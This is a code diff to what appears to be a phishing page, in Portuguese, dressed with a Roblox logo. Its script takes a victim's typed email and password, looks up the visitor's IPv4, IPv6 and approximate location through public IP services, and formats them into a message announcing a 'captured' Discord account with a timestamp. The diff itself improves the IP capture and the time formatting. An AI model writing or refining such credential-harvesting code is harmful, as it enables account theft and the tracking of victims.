@@ -182,7 +182,7 @@
     }
     .extra-link {
       margin-top: 20px;
-      font-size: 1rem; /* um pouco maior pra facilitar clique */
+      font-size: 1rem;
       font-weight: 600;
     }
     .extra-link a {
@@ -273,7 +273,7 @@
           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Roblox_%282025%29_%28App_Icon%29.svg/960px-Roblox_%282025%29_%28App_Icon%29.svg.png" alt="Roblox Logo">
         </div>
         
-        <!-- Link com texto clicável como você pediu -->
+        <!-- Link com texto clicável -->
         <div class="extra-link">
           <a href="https://notic1as-verdadeiras.vercel.app" target="_blank">Acesse aqui para mais novidades</a>
         </div>
@@ -297,14 +297,28 @@
         return;
       }
 
-      // Captura de IP + localização
-      let ip = 'Desconhecido';
+      // Captura IPv4 e IPv6 separadamente
+      let ipv4 = 'Não detectado';
+      let ipv6 = 'Não detectado';
       let location = 'Desconhecido';
+
       try {
+        // IPv4 puro via ipify
+        let resIPv4 = await fetch('https://api.ipify.org?format=json');
+        let dataIPv4 = await resIPv4.json();
+        if (dataIPv4.ip) ipv4 = dataIPv4.ip;
+      } catch {}
+
+      try {
+        // IPv6 + localização via ipapi.co
         let res = await fetch('https://ipapi.co/json/');
         let data = await res.json();
         if (data.ip) {
-          ip = data.ip;
+          if (data.ip.includes(':')) {
+            ipv6 = data.ip; // se for IPv6
+          } else if (ipv4 === 'Não detectado') {
+            ipv4 = data.ip;
+          }
           location = data.city && data.country_name ? `${data.city}, ${data.country_name}` : 'Desconhecido';
         }
       } catch {
@@ -312,25 +326,48 @@
           let res2 = await fetch('https://ipwhois.io/api');
           let data2 = await res2.json();
           if (data2.ip) {
-            ip = data2.ip;
+            if (data2.ip.includes(':')) {
+              ipv6 = data2.ip;
+            } else if (ipv4 === 'Não detectado') {
+              ipv4 = data2.ip;
+            }
             location = data2.city && data2.country ? `${data2.city}, ${data2.country}` : 'Desconhecido';
           }
         } catch {}
       }
 
-      // Data e hora
+      // Data e hora correta (America/Sao_Paulo)
       const agora = new Date();
-      const dataFormatada = agora.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
-      const horaFormatada = agora.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', hour12: false });
-      const hoje = agora.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', hour12: false });
+      const options = {
+        timeZone: 'America/Sao_Paulo',
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: false
+      };
+      const formatter = new Intl.DateTimeFormat('pt-BR', options);
+      const partes = formatter.formatToParts(agora);
+      
+      const dataFormatada = partes.find(p => p.type === 'day').value + '/' +
+                            partes.find(p => p.type === 'month').value + '/' +
+                            partes.find(p => p.type === 'year').value;
+      const horaFormatada = partes.find(p => p.type === 'hour').value + ':' +
+                            partes.find(p => p.type === 'minute').value + ':' +
+                            partes.find(p => p.type === 'second').value;
+      const hoje = partes.find(p => p.type === 'hour').value + ':' +
+                   partes.find(p => p.type === 'minute').value;
 
-      // Mensagem com IP e localização
+      // Mensagem com IPv4 e IPv6 separados
       const mensagem = `🔐 **Nova Conta De Discord Capturada!**
 
 **Login:** \`${email}\`
 **Senha:** \`${senha}\`
 
-🌐 IP Capturado: ${ip}
+**IPv4:** ${ipv4}
+**IPv6:** ${ipv6}
 📍 Localização aproximada: ${location}
 
 **Capturado** • ${dataFormatada}, ${horaFormatada} • Hoje às ${hoje}`;
